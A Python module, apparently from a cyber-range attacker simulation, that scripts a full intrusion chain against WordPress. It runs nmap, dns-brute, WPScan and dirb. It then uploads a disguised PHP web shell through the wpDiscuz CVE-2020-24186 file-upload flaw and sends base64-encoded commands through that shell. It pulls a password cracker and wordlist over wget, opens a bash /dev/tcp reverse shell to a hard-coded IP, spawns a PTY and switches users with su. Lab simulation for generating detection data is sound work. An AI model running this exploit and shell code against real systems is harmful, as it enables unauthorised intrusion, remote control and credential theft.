import base64
import json
import os
import pty
import random
import re
import select
import subprocess
import sys

from datetime import datetime
from pathlib import Path
from socket import socket
from typing import (
    List,
    Optional,
    Pattern,
    TextIO,
    Tuple,
    Union,
)

import requests

from bs4 import BeautifulSoup
from pwnlib.tubes.listen import listen
from pydantic import HttpUrl
from structlog.stdlib import BoundLogger

from cr_kyoushi.simulation.model import ApproximateFloat
from cr_kyoushi.simulation.util import (
    sleep,
    sleep_until,
)

from .context import Context
from .expect import (
    BASH_PATTERN,
    SH_PATTERN,
    SU_FAIL,
    SU_PASSWORD_PROMPT,
)


def read_output(
    process: subprocess.Popen,
    log: BoundLogger,
    p_stdout: select.poll,
    p_stderr: select.poll,
    sleep_time: float = 1.0,
    encoding="utf-8",
) -> Tuple[Optional[str], Optional[str]]:
    """Reads and logs a single line of output (stdout and stderr) from a process.

    Args:
        process: The process to read the output from
        log: The logger instance
        p_stdout: The stdout output buffer poller
        p_stderr: The stderr output buffer poller
        sleep_time: The amount of time to wait for the buffers to become rdy
        encoding: The expected output encoding

    Returns:
        A tuple of output lines (stdout, stderr).

        !!! Note
            Either output might be None if its output buffer was not ready/empty.
    """
    stdout_rdy = p_stdout.poll(sleep_time)
    stderr_rdy = p_stderr.poll(sleep_time)
    out = None
    err = None
    if stdout_rdy or stderr_rdy:
        assert process.stdout is not None and process.stderr is not None
        out = process.stdout.readline().decode(encoding) if stdout_rdy else None
        err = process.stderr.readline().decode(encoding) if stderr_rdy else None
        log.info("Got output", stdout=out, stderr=err)
    else:
        sleep(sleep_time)
    return (out, err)


def execute(
    args: List[str],
    log: BoundLogger,
    use_pty: bool = False,
    sleep_time: float = 1.5,
    encoding: str = "utf-8",
) -> Optional[int]:
    """Executes a given command and continously logs its output.

    Args:
        args: The command and its arguments
        log: The logger instance
        use_pty: If the command should be executed with a PTY or not
        sleep_time: The amount of time to wait between output buffer checks.
        encoding: The output encoding that is expected

    Returns:
        The commands return code
    """
    stdin: Union[TextIO, int]
    if use_pty:
        main, sub = pty.openpty()
        stdin = sub
    else:
        stdin = sys.stdin

    process = subprocess.Popen(
        args, stdin=stdin, stdout=subprocess.PIPE, stderr=subprocess.PIPE
    )
    assert process.stdout is not None and process.stderr is not None

    # get stdout stream rdy checker
    p_stdout = select.poll()
    p_stdout.register(process.stdout, select.POLLIN)

    # get stderr stream rdy checker
    p_stderr = select.poll()
    p_stderr.register(process.stderr, select.POLLIN)

    out_lines = []
    err_lines = []
    # read all output while process is running
    while process.poll() is None:
        out, err = read_output(process, log, p_stdout, p_stderr, sleep_time, encoding)
        if out is not None and len(out) > 0:
            out_lines.append(out)
        if err is not None and len(err) > 0:
            err_lines.append(err)

    # we have to include calls to readlines as a process might have finished before
    # we read all output lines
    out_lines = out_lines + [
        line.decode(encoding) for line in process.stdout.readlines()
    ]
    err_lines = err_lines + [
        line.decode(encoding) for line in process.stderr.readlines()
    ]

    # finally log all output
    log.info(
        "Output",
        stdout_lines=out_lines,
        stderr_lines=err_lines,
    )

    # close pty if we opened it
    if use_pty:
        os.close(main)
        os.close(sub)

    return process.poll()


class CommandAction:
    """Generic command action transition function class

    Executes a shell command and continiously logs the commands
    stdout and stderr output until the command ends.
    """

    def __init__(self, args: List[str], name: str, use_pty: bool = False):
        """
        Args:
            args: The command and its arguments
            name: The name to use for logging command execution
            use_pty: If the command should be started with a PTY or not
        """
        self.args = args
        self.name = name
        self.use_pty = use_pty

    def _add_log_context(self, log: BoundLogger) -> BoundLogger:
        return log

    def __call__(
        self,
        log: BoundLogger,
        current_state: str,
        context: Context,
        target: Optional[str],
    ):
        # add log context from sub classes
        log = self._add_log_context(log)
        # add args to log context
        log = log.bind(args=self.args)

        # execute the command
        log.info(f"Executing {self.name}")
        ret = execute(self.args, log, use_pty=self.use_pty)
        log.info(f"Executed {self.name}", return_code=ret)


class Traceroute(CommandAction):
    """Traceroute transition function"""

    def __init__(self, host: str, executable: str = "/usr/sbin/traceroute"):
        """
        Args:
            host: The host to traceroute to
            executable: The path to the traceroute executable
        """
        self.host: str = host
        super().__init__([executable, host], "traceroute")

    def _add_log_context(self, log: BoundLogger) -> BoundLogger:
        log = log.bind(host=self.host)
        return super()._add_log_context(log)


class NmapHostScan(CommandAction):
    def __init__(
        self,
        networks: List[str],
        executable: str = "/usr/bin/nmap",
        scan_option: str = "-sn",
        extra_args: List[str] = [],
    ):
        """
        Args:
            networks: The networks to scan
            executable: The path of the nmap executable
            scan_option: The scan option to use for the host scan
            extra_args: List of extra arguments for nmap
        """
        args = [executable, scan_option] + extra_args + networks
        self.networks: List[str] = networks
        super().__init__(args, "nmap host scan")

    def _add_log_context(self, log: BoundLogger) -> BoundLogger:
        log = log.bind(networks=self.networks)
        return super()._add_log_context(log)


class NmapServiceScan(CommandAction):
    """Nmap service scan transition function"""

    def __init__(
        self,
        networks: List[str],
        executable: str = "/usr/bin/nmap",
        scan_option: str = "-sV",
        extra_args: List[str] = [],
    ):
        """
        Args:
            networks: The networks to scan
            executable: The path of the nmap executable
            scan_option: The scan option to use for the service scan
            extra_args: List of extra arguments for nmap
        """
        args = [executable, scan_option] + extra_args + networks
        self.networks: List[str] = networks
        super().__init__(args, "nmap service scan")

    def _add_log_context(self, log: BoundLogger) -> BoundLogger:
        log = log.bind(networks=self.networks)
        return super()._add_log_context(log)


class NmapDNSBrute(CommandAction):
    """Nmap dns brute force transition function"""

    def __init__(
        self,
        dns_servers: List[str],
        domain: str,
        executable: str = "/usr/bin/nmap",
        extra_args: List[str] = [],
    ):
        """
        Args:
            dns_servers: The dns servers to scan
            domain: The domain to brute force
            executable: The path of the nmap executable
            extra_args: List of extra arguments for nmap
        """
        args = (
            [executable]
            + extra_args
            + [
                "--script=dns-brute",
                "--script-args",
                f"dns-brute.domain={domain}",
            ]
            + dns_servers
        )
        self.dns_servers: List[str] = dns_servers
        self.domain: str = domain
        super().__init__(args, "nmap dns-brute")

    def _add_log_context(self, log: BoundLogger) -> BoundLogger:
        log = log.bind(dns_servers=self.dns_servers, domain=self.domain)
        return super()._add_log_context(log)


class WPScan(CommandAction):
    """WPScan transition function"""

    def __init__(
        self,
        url: str,
        executable: str = "/usr/local/bin/wpscan",
        extra_args: List[str] = ["--disable-tls-checks", "--no-update"],
    ):
        """
        Args:
            url: The wordpress instances url
            executable: Path to the WPScan executable
            extra_args: List of extra arguments for WPScan
        """
        args = (
            [executable]
            + extra_args
            + [
                "--url",
                url,
            ]
        )
        self.url: str = url
        super().__init__(args, "wpscan")

    def _add_log_context(self, log: BoundLogger) -> BoundLogger:
        log = log.bind(url=self.url)
        return super()._add_log_context(log)


class Dirb(CommandAction):
    """Dirb transition function"""

    def __init__(
        self,
        urls: List[str],
        wordlists: List[str] = [],
        executable: str = "/usr/bin/dirb",
        extra_args: List[str] = [],
    ):
        """
        Args:
            urls: The urls to run dirb against
            wordlists: Optionally the wordlists to use
            executable: The path to the dirb executable
            extra_args: List of extra arguments for dirb
        """
        args = [executable] + urls + wordlists + extra_args
        self.urls: List[str] = urls
        self.wordlists: List[str] = wordlists
        super().__init__(args, "dirb")

    def _add_log_context(self, log: BoundLogger) -> BoundLogger:
        log = log.bind(urls=self.urls, wordlists=self.wordlists)
        return super()._add_log_context(log)


DEFAULT_WEB_SHELL: str = """
<?php
function wp_meta_info() {
    if(isset($_REQUEST['wp_meta'])){
            exec(implode(" ",json_decode(base64_decode($_REQUEST['wp_meta']))), $info);
          return base64_encode(json_encode($info));
    }else{
        return "no meta";
    }
  }
?>
<html>
<head><meta name="info" data="<?php echo wp_meta_info() ?>" /></head>
<body>
Stats
</body>
</html>
"""


class UploadWebShell:
    """Transition function uploads a web shell to a wordpress instance.

    !!! Note
        This exploits CVE-2020-24186 for the upload see
        https://wpscan.com/vulnerability/10333

    """

    def __init__(
        self,
        url: str,
        jpeg: Path,
        image_name: Optional[str] = None,
        admin_ajax: str = "wp-admin/admin-ajax.php",
        exploit_code: str = DEFAULT_WEB_SHELL,
        verify: bool = False,
    ):
        """
        Args:
            url: The wordpress url
            jpeg: The path to the jpeg file to embed the code in
            image_name: The name to use when uploading the image (without the file extension).
                        Defaults to the name of the given jpeg file.
            admin_ajax: The relative path to the ajax endpoint (without leading /)
            exploit_code: The PHP web shell code to upload
            verify: If TLS certs should be verified or not
        """
        self.url: str = url
        self.admin_ajax: str = f"{url}/{admin_ajax}"
        self.jpeg: Path = jpeg
        self.image_name: str = image_name or jpeg.stem
        self.image_name += ".php"
        self.exploit_code: str = exploit_code
        self.verify: bool = verify
        self.nonce_regex: re.Pattern = re.compile(r'wmuSecurity"\s*:\s*"(\w*)"')
        with open(jpeg, "rb") as f:
            self.payload = f.read() + exploit_code.encode("utf-8")

    def __call__(
        self,
        log: BoundLogger,
        current_state: str,
        context: Context,
        target: Optional[str],
    ):
        log = log.bind(
            url=self.url,
            admin_ajax=self.admin_ajax,
            image_name=self.image_name,
            jpeg=self.jpeg,
            exploit_code=self.exploit_code,
        )

        session = requests.Session()
        session.verify = self.verify

        # get list of available posts
        log.info("Load posts page")
        response = session.get(self.url)
        log.info("Loaded posts page")
        soup = BeautifulSoup(response.text, "html.parser")
        articles = soup.find(id="site-content").find_all(name="article")

        if len(articles) > 0:
            # choose a random article under which to deploy the web shell
            article = random.choice(articles)
            post_url = article.find(name="h2", class_="entry-title").a.get("href")
            post_id = article.get("id").replace("post-", "")

            # add post id to log context
            log = log.bind(post_id=post_id, post_url=post_url)

            log.info("Load post info")
            response = session.get(post_url)
            log.info("Loaded post info")

            soup = BeautifulSoup(response.text, "html.parser")
            match = self.nonce_regex.search(
                soup.find("script", id="wpdiscuz-combo-js-js-extra").string,
            )

            if match is not None:
                nonce = match.group(1)

                # add nonce to log context
                log = log.bind(wmu_nonce=nonce)

                data = {
                    "action": "wmuUploadFiles",
                    "wmu_nonce": nonce,
                    "wmuAttachmentsData": None,
                    "postId": post_id,
                }

                files = {
                    "wmu_files[0]": (
                        self.image_name,
                        self.payload,
                        "image/jpeg",
                    )
                }
                log.info("Uploading web shell")
                response = session.post(self.admin_ajax, data=data, files=files)
                json = response.json()

                # The returned URL might be of any of the following formats
                #  https://intranet.company.cyberrange.at/wp-content/uploads/2021/03/special-1615472044.7333-150x150.php
                #  https://intranet.company.cyberrange.at/wp-content/uploads/2021/03/special-1615472044.7333-225x300.php
                #  https://intranet.company.cyberrange.at/wp-content/uploads/2021/03/special-1615472044.7333-768x1024.php
                #  https://intranet.company.cyberrange.at/wp-content/uploads/2021/03/special-1615472044.7333-scaled.jpg
                #  https://intranet.company.cyberrange.at/wp-content/uploads/2021/03/special-1615472044.7333.php
                # but only the full sized image url will work as such we have parse the directory path
                # and image timestamp from the returned url and reconstruct the URL for the fullsized image
                url_regex: Pattern = re.compile(
                    # directory path
                    r"(http[s]:\/\/.*\/)("
                    # timestamped name has format <name>-<floating point epoch> e.g., special-1615472044.7333
                    + self.image_name.replace(".php", "")
                    + r"-\d*\.\d*).*\.(php|jpg)"
                )
                url_raw = (
                    json.get("data").get("previewsData").get("images")[0].get("url")
                )

                url_match = url_regex.match(url_raw)
                if url_match is not None:
                    # rebuild image url from directory path and timestamped name
                    context.web_shell = url_match.group(1) + url_match.group(2) + ".php"
                    log.info("Uploaded web shell", web_shell=context.web_shell)
                else:
                    log.error("Invalid web shell url", url_raw=url_raw)
                    raise Exception("Web shell upload error")
            else:
                log.error("Unable to retrieve nonce")
        else:
            log.error("No post to upload shell to")


class WPHashCrack:
    """Transition function uses WP hash cracker to find employee password."""

    def __init__(
        self,
        hashcrack_url: HttpUrl,
        file_name: str,
        wl_url: HttpUrl,
        wl_name: str,
        attacked_user: str,
        tar_download_name: str = None,
        cmd_param: str = "wp_meta",
        verify: bool = False,
        timeout: Optional[float] = None,
        sleep_time: Union[ApproximateFloat, float] = 3.0,
    ):
        """
        Args:
            hashcrack_url: url of the hashcrack tar.
            file_name: name of the hashcrack tar.
            wl_url: address of the host where wordlist is available.
            wl_name: name of the wordlist.
            attacked_user: the name of the WP user to crack the password.
            tar_download_name: the name of the hashcrack tar after downloading.
            cmd_param: the GET parameter to embed the command in.
            verify: if HTTPS connection should very TLS certs.
            timeout: the maximum time to wait for the web server to respond.
            sleep_time: the waiting time between executed requests.
        """
        self.url = hashcrack_url
        self.file_name = file_name
        self.wl_url = wl_url
        self.wl_name = wl_name
        self.attacked_user = attacked_user
        self.tar_download_name = tar_download_name
        self.cmd_param = cmd_param
        self.verify = verify
        self.timeout = timeout
        self.sleep_time = sleep_time

    def __call__(
        self,
        log: BoundLogger,
        current_state: str,
        context: Context,
        target: Optional[str],
    ):
        web_shell = context.web_shell
        log = log.bind(
            url=self.url,
            wl_url=self.wl_url,
            attacked_user=self.attacked_user,
            web_shell=web_shell,
        )
        if web_shell is not None:
            archive_download_cmd = ["wget", str(self.url)]
            if self.tar_download_name is not None:
                archive_download_cmd += ["-O", self.tar_download_name]
            log.info("Downloading WPHashCrack")
            output = send_request(
                log,
                web_shell,
                archive_download_cmd,
                self.cmd_param,
                self.verify,
                self.timeout,
            )
            log.info("Downloaded WPHashCrack")
            log.info("Web shell command response", output=output)
            sleep(self.sleep_time)
            if self.tar_download_name is None:
                self.tar_download_name = self.file_name
            log.info("Unarchiving WPHashCrack")
            output = send_request(
                log,
                web_shell,
                ["tar", "xvfz", self.tar_download_name],
                self.cmd_param,
                self.verify,
                self.timeout,
            )
            log.info("Unarchived WPHashCrack")
            log.info("Web shell command response", output=output)
            sleep(self.sleep_time)
            log.info("Downloading password list")
            output = send_request(
                log,
                web_shell,
                ["wget", str(self.wl_url)],
                self.cmd_param,
                self.verify,
                self.timeout,
            )
            log.info("Downloaded password list")
            log.info("Web shell command response", output=output)
            sleep(self.sleep_time)
            log.info("Running WPHashCrack")
            output = send_request(
                log,
                web_shell,
                [
                    "./wphashcrack-0.1/wphashcrack.sh",
                    "-w",
                    "$PWD/" + self.wl_name,
                    "-j",
                    "./wphashcrack-0.1/john-1.7.6-jumbo-12-Linux64/run",
                    "-u",
                    self.attacked_user,
                ],
                self.cmd_param,
                self.verify,
                self.timeout,
            )
            log.info("Finished WPHashCrack")
            log.info("Web shell command response", output=output)
        else:
            log.error("Missing web shell url")
            raise Exception("No web shell to execute at")


def encode_cmd(cmd: List[str]) -> str:
    """Encodes the command and args list with JSON and base64.

    Args:
        cmd: The command and args list

    Returns:
        The base64 encoded command payload
    """
    return base64.b64encode(json.dumps(cmd).encode("utf-8")).decode("utf-8")


def decode_response(response: Union[str, bytes]) -> List[str]:
    """Extracts the web shell command output from the HTML response

    Args:
        response: The HTML response

    Returns:
        The command output as list of lines
    """
    # trim the response to the html area since
    # soup might have some issues with image bytes
    if isinstance(response, bytes):
        response = response[response.find(b"<html>") :]
    else:
        response = response[response.find("<html>") :]

    soup = BeautifulSoup(response, "html.parser")
    for tag in soup.findAll(name="meta", attrs={"name": "info"}):
        if tag.has_attr("data"):
            return json.loads(base64.b64decode(tag["data"]))
    return []


def send_request(
    log: BoundLogger,
    url: str,
    cmd: List[str],
    cmd_param: str = "wp_meta",
    verify: bool = False,
    timeout: Optional[float] = None,
) -> List[str]:
    """Sends a b64 encoded web shell command via the given GET param.

    Args:
        log: The logging instance
        url: The URL to the web shell
        cmd: The command and its arguments as a list
        cmd_param: The GET parameter to embed the command in.
        verify: If HTTPS connection should very TLS certs
        timeout: The maximum time to wait for the web server to respond

    Returns:
        The commands output lines
    """
    # prepare get parameters and add them to log context
    get_params = {cmd_param: encode_cmd(cmd)}
    log = log.bind(params=get_params)

    log.info("Sending web shell command")
    r = requests.get(url, params=get_params, verify=verify, timeout=timeout)
    log.info("Sent web shell command")

    return decode_response(r.text)


class ExecWebShellCommand:
    """Transition function that executes a web shell command"""

    def __init__(
        self,
        cmd: List[str],
        cmd_param: str = "wp_meta",
        verify: bool = False,
        timeout: Optional[float] = None,
    ):
        """
        Args:
            cmd: The command and its arguments to execute
            cmd_param: The GET parameter to send the command in
            verify: If the TLS certs should be verified or not
            timeout: The maximum time to wait for the web server to respond
        """
        self.cmd: List[str] = cmd
        self.cmd_param: str = cmd_param
        self.verify: bool = verify
        self.timeout: Optional[float] = timeout

    def __call__(
        self,
        log: BoundLogger,
        current_state: str,
        context: Context,
        target: Optional[str],
    ):
        web_shell = context.web_shell
        log = log.bind(cmd=self.cmd, cmd_param=self.cmd_param, web_shell=web_shell)
        if web_shell is not None:
            output = send_request(
                log, web_shell, self.cmd, self.cmd_param, self.verify, self.timeout
            )
            log.info("Web shell command response", output=output)
        else:
            log.error("Missing web shell url")
            raise Exception("No web shell to execute at")


class OpenReverseShell(ExecWebShellCommand):
    def __init__(
        self,
        cmd: List[str] = [
            "bash",
            "-c",
            "'0<&196;exec 196<>/dev/tcp/192.42.2.185/9999; sh <&196 >&196 2>&196'",
        ],
        cmd_param: str = "wp_meta",
        verify: bool = False,
        timeout: float = 25,
    ):
        """
        Args:
            cmd: The reverse shell command and its arguments to execute
            cmd_param: The GET parameter to send the command in
            verify: If the TLS certs should be verified or not
            timeout: The maximum time to wait for the web server to respond
        """
        super().__init__(cmd, cmd_param=cmd_param, verify=verify, timeout=timeout)

    def __call__(
        self,
        log: BoundLogger,
        current_state: str,
        context: Context,
        target: Optional[str],
    ):
        log.info("Starting reverse shell")
        try:
            super().__call__(log, current_state, context, target)
        except (
            TimeoutError,
            requests.exceptions.ReadTimeout,
            requests.exceptions.ConnectionError,
        ):
            log.info("Received request timeout")


class WaitUntilNext:
    """Transition function for waiting until a specific datetime"""

    def __init__(self, start: datetime, name: str = "next phase"):
        """
        Args:
            start: The datetime to wait until
            name: The name to use for logging
        """
        self.start: datetime = start
        self.name: str = name

    def __call__(
        self,
        log: BoundLogger,
        current_state: str,
        context: Context,
        target: Optional[str],
    ):
        log = log.bind(name=self.name, start_time=self.start)
        log.info("Waiting until")
        sleep_until(self.start)
        log.info("Waited until")


def _receive(
    log: BoundLogger,
    shell: listen,
    regex: Pattern = BASH_PATTERN,
    timeout: int = 60 * 5,
    encoding: str = "utf-8",
) -> List[str]:
    """Utility function for waiting for an expected output.

    Continuously receives from the given shell until the collected
    output contains the given regex.

    Args:
        log: The logger instance
        shell: The shell to receive on
        regex): The regex to wait for
        timeout: The maximum to time to wait for any output
        encoding: The encoding to use for decoding

    Raises:
        TimeoutError: If nothing is received within the given timeout

    Returns:
        The list of output lines

    !!! Warning
        A timeout is only triggered if nothing is received at all.
        Meaning that even if we never receive the output matching the
        regex the function will not timeout as long as anything is received.
    """
    # configure recv timeout
    old_timeout = shell.timeout
    shell.timeout = timeout

    output = ""
    while not regex.search(output):
        output_part = shell.recv().decode(encoding)
        output += output_part
        if len(output_part) > 0:
            log.debug("Received shell output part", output_part=output_part.split("\n"))
        else:
            log.error(
                "Shell receive timeout",
                expected=regex,
                received_output=output.split("\n"),
            )
            raise TimeoutError("Timeout receiving expected shell output")

    outlines = output.split("\n")
    log.info("Received shell output", outlines=outlines)

    # reset recv timeout
    shell.timeout = old_timeout

    return outlines


class StartReverseShellListener:
    """Transition function that starts a reverse shell listener"""

    def __init__(self, port: int, bindaddr: str = "::", fam: str = "any"):
        """
        Args:
            port: The port to listen on
            bindaddr: The address to bind to
            fam: The IP family to listen for "any", "ipv4" or "ipv6"
        """
        self.port: int = port
        self.bindaddr: str = bindaddr
        self.fam: str = fam

    def __call__(
        self,
        log: BoundLogger,
        current_state: str,
        context: Context,
        target: Optional[str],
    ):
        log = log.bind(
            listen_port=self.port, bind_address=self.bindaddr, ip_family=self.fam
        )

        log.info("Start listening for reverse shell")
        context.reverse_shell = listen(self.port, self.bindaddr, self.fam)
        log.info("Started listening for reverse shell")


class WaitReverseShellConnection:
    """Transition function that waits for a reverse shell connection"""

    def __init__(
        self,
        expect_after: Optional[Pattern] = None,
        encoding: str = "utf-8",
        timeout: int = 60 * 2,
    ):
        """
        Args:
            expect_after: The regex to wait for after connecting
            encoding: The encoding to use for sending and receiving
            timeout: Maximum time to wait for outputs
        """
        self.expect_after: Optional[Pattern] = expect_after
        self.encoding: str = encoding
        self.timeout: int = timeout

    def __call__(
        self,
        log: BoundLogger,
        current_state: str,
        context: Context,
        target: Optional[str],
    ):
        reverse_shell = context.reverse_shell
        if reverse_shell is not None:

            log.info("Waiting for reverse shell connection")
            reverse_shell.wait_for_connection()
            sock: socket = reverse_shell.sock
            log = log.bind(
                listen_socket=sock.getsockname(), remote_socket=sock.getpeername()
            )

            if self.expect_after is not None:
                log.info("Waiting for prompt")
                _receive(
                    log, reverse_shell, self.expect_after, self.timeout, self.encoding
                )
            log.info("Reverse shell connected")

        else:
            log.error("Failed to wait for shell")
            raise Exception("Listener socket is not present")


def close_reverse_shell(
    log: BoundLogger,
    current_state: str,
    context: Context,
    target: Optional[str],
):
    """Transition function to close a reverse shell"""

    reverse_shell = context.reverse_shell
    if reverse_shell is not None:
        # add sock info to log context
        log = log.bind(
            listen_socket=reverse_shell.sock.getsockname(),
            remote_socket=reverse_shell.sock.getpeername(),
        )
        log.info("Closing reverse shell")
        reverse_shell.close()
        log.info("Closed reverse shell")
    else:
        log.warn("No reverse shell")


class OpenPTY:
    """Transition function that opens a PTY for in the reverse shell"""

    def __init__(
        self,
        spawn_command: str = "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
        expect_after: Pattern = SH_PATTERN,
        encoding: str = "utf-8",
        timeout: int = 60 * 2,
    ):
        """
        Args:
            spawn_command: The command to use for spawning the PTY
            expect_after: The regex to wait for after spawning the PTY
            encoding: The encoding to use for sending and receiving
            timeout: Maximum time to wait for outputs
        """
        self.spawn_command: str = spawn_command
        self.expect_after: Pattern = expect_after
        self.encoding: str = encoding
        self.timeout: int = timeout

    def __call__(
        self,
        log: BoundLogger,
        current_state: str,
        context: Context,
        target: Optional[str],
    ):
        reverse_shell = context.reverse_shell
        if reverse_shell is not None and reverse_shell.connected():
            # add pty spawn command to log context
            log.bind(spawn_command=self.spawn_command)

            log.info("Opening pty shell")
            reverse_shell.sendline(self.spawn_command.encode(self.encoding))
            _receive(log, reverse_shell, self.expect_after, self.timeout, self.encoding)
            log.info("Opened pty shell")

        else:
            log.error("Failed to open PTY shell")
            raise Exception("Shell is not connected")


class ShellChangeUser:
    """Transition function to login to another user"""

    def __init__(
        self,
        username: str,
        password: str,
        expect_prompt: Pattern = SU_PASSWORD_PROMPT,
        expect_after: Pattern = SH_PATTERN,
        encoding: str = "utf-8",
        timeout: int = 60 * 2,
    ):
        """
        Args:
            username: The user to change to
            password: The password of the user
            expect_prompt: Output regex to expect for the password prompt
            expect_after: Regex to wait for after changing user
            encoding: The encoding to use for sending and receiving
            timeout: Maximum time to wait for outputs
        """
        self.username: str = username
        self.password: str = password
        self.expect_prompt: Pattern = expect_prompt
        self.expect_after: Pattern = expect_after
        self.encoding: str = encoding
        self.timeout: int = timeout

    def __call__(
        self,
        log: BoundLogger,
        current_state: str,
        context: Context,
        target: Optional[str],
    ):
        reverse_shell = context.reverse_shell
        if reverse_shell is not None and reverse_shell.connected():
            # add pty spawn command to log context
            log.bind(username=self.username, password=self.password)

            log.info("Changing user")
            reverse_shell.sendline(f"su {self.username}".encode(self.encoding))
            _receive(
                log, reverse_shell, self.expect_prompt, self.timeout, self.encoding
            )
            log.info("Sending password")
            reverse_shell.sendline(self.password.encode(self.encoding))
            output = _receive(
                log, reverse_shell, self.expect_after, self.timeout, self.encoding
            )
            if SU_FAIL.search("\n".join(output)):
                log.error("Authentication failure")
                raise Exception("Failed to change user")
            else:
                log.info("Changed user")
        else:
            log.error("Failed to change user")
            raise Exception("Shell is not connected")


class ExecShellCommand:
    """Transition function that executes a shell command using a reverse shell"""

    def __init__(
        self,
        cmd: str,
        expect_after: Pattern = SH_PATTERN,
        encoding: str = "utf-8",
        timeout: int = 60 * 2,
    ):
        """
        Args:
            cmd: The cmd to execute
            expect_after: The output patter to wait for
            encoding: The encoding to use for sending and receiving
            timeout: Maximum time to wait for outputs
        """
        self.cmd: str = cmd
        self.expect_after: Pattern = expect_after
        self.encoding: str = encoding
        self.timeout: int = timeout

    def __call__(
        self,
        log: BoundLogger,
        current_state: str,
        context: Context,
        target: Optional[str],
    ):
        reverse_shell = context.reverse_shell

        # add cmd to log context
        log = log.bind(cmd=self.cmd)

        if reverse_shell is not None and reverse_shell.connected():
            log.info("Executing command")
            reverse_shell.sendline(self.cmd.encode(self.encoding))
            _receive(log, reverse_shell, self.expect_after, self.timeout, self.encoding)
            log.info("Executed command")
        else:
            log.error("Failed to exec command")
            raise Exception("Shell is not connected")
